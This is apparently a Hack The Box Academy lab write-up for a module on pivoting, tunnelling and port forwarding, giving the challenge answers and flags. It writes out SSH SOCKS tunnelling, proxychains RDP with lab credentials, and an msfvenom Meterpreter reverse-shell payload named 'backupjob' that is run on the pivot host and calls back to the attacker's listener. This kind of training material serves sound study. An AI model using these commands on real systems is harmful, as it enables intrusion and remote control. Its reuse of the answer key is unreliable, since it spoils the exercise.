# HTB-Pivoting_Tunneling_and_Port_Forwarding
## Table of Contents
1. [Choosing The Dig Site & Starting Our Tunnels](#choosing-the-dig-site--starting-our-tunnels)
    1. [Dynamic Port Forwarding with SSH and SOCKS Tunneling](#dynamic-port-forwarding-with-ssh-and-socks-tunneling)
    2. [Remote/Reverse Port Forwarding with SSH](#remotereverse-port-forwarding-with-ssh)
    3. [Meterpreter Tunneling & Port Forwarding](#meterpreter-tunneling--port-forwarding)
2. [Playing Pong with Socat](#playing-pong-with-socat)
    1. [Socat Redirection with a Reverse Shell](#socat-redirection-with-a-reverse-shell)
    2. [Socat Redirection with a Bind Shell](#socat-redirection-with-a-bind-shell)

## Introduction
### Challenges
1. Reference the Using ifconfig output in the section reading. Which NIC is assigned a public IP address?

    The answer is `eth0`.

2. Reference the Routing Table on Pwnbox output shown in the section reading. If a packet is destined for a host with the IP address of 10.129.10.25, out of which NIC will the packet be forwarded?

    The answer is `tun0`.

3. Reference the Routing Table on Pwnbox output shown in the section reading. If a packet is destined for www.hackthebox.com what is the IP address of the gateway it will be sent to?

    The answer is `178.62.64.1`. It is a default gateaway.

## Choosing The Dig Site & Starting Our Tunnels
### Dynamic Port Forwarding with SSH and SOCKS Tunneling
#### Challenges
1. You have successfully captured credentials to an external facing Web Server. Connect to the target and list the network interfaces. How many network interfaces does the target web server have? (Including the loopback interface)

    First we can ssh by using the credential provided. Then in there, we can type `ifconfig`. The answer is `3`.

2. Apply the concepts taught in this section to pivot to the internal network and use RDP (credentials: victor:pass@123) to take control of the Windows target on 172.16.5.19. Submit the contents of Flag.txt located on the Desktop.

    To solve this, we can use dynamic port forwarding with ssh.

    ```bash
    ssh -D 9050 ubuntu@10.129.175.61
    ```
    Then we can use xfreerdp with proxychains.
    
    ```bash
    proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
    ```
    The answer is `N1c3Piv0t`.

### Remote/Reverse Port Forwarding with SSH
#### Challenges
1. Which IP address assigned to the Ubuntu server Pivot host allows communication with the Windows server target? (Format: x.x.x.x)

    After we ssh with the credential, we can type `ifconfig` and look `ens224` inet result. The answer is `172.16.5.129`.

2. What IP address is used on the attack host to ensure the handler is listening on all IP addresses assigned to the host? (Format: x.x.x.x)

    The answer is `0.0.0.0`. That ip will listen connection from anywhere.

### Meterpreter Tunneling & Port Forwarding
#### Challenges
1. What two IP addresses can be discovered when attempting a ping sweep from the Ubuntu pivot host? (Format: x.x.x.x,x.x.x.x)

    To solve this, we can use `msfvenom` and `msfconsole`. First, we create payload for ubuntu pivot host. It is a reverse shell. So when its executed, we will get a shell session.

    ```bash
    msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.131 -f elf -o backupjob LPORT=8080
    ```
    Then we can use scp to transfer it into out pivot host.

    ```bash
    scp backupjob ubuntu@10.129.175.61:/home/ubuntu/
    ```
    Still in the out attack host, we set listener for our reverse shell by using metasploit.

    ```bash
    [msf](Jobs:0 Agents:0) >> use exploit/multi/handler
    [*] Using configured payload generic/shell_reverse_tcp
    [msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lhost 0.0.0.0
    lhost => 0.0.0.0
    [msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lport 8080
    lport => 8080
    [msf](Jobs:0 Agents:0) exploit(multi/handler) >> set payload linux/x64/meterpreter/reverse_tcp
    payload => linux/x64/meterpreter/reverse_tcp
    [msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
    ```

    Then in the pivot host, we can change file permission and executed it.

    ```bash
    chmod +x backupjob
    ./backupjob
    ```
    If success out listener will catch it and create meterpreter session. In there we can do ping sweep.

    ```bash
    (Meterpreter 1)(/home/ubuntu) > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
    ```
    ![alt text](Assets/Starting1.png)

    Based on that, we got 2 ip. So the answer is `172.16.5.19,172.16.5.129`.

2. Which of the routes that AutoRoute adds allows 172.16.5.19 to be reachable from the attack host? (Format: x.x.x.x/x.x.x.x)

    To solve this, we can run `autoroute` module.

    ```bash
    (Meterpreter 1)(/home/ubuntu) > run autoroute -s 172.16.5.0/23
    ```

    The answer is `172.16.5.0/255.255.254.0`.

## Playing Pong with Socat
### Socat Redirection with a Reverse Shell
#### Challenges
1. SSH tunneling is required with Socat. True or False?

    It is already mentioned in the module that `Socat is a bidirectional relay tool that can create pipe sockets between 2 independent network channels without needing to use SSH tunneling`. So the answer is `False`.

### Socat Redirection with a Bind Shell
#### Challenges
1. What Meterpreter payload did we use to catch the bind shell session? (Submit the full path as the answer)

    The answer is `windows/x64/meterpreter/bind_tcp`.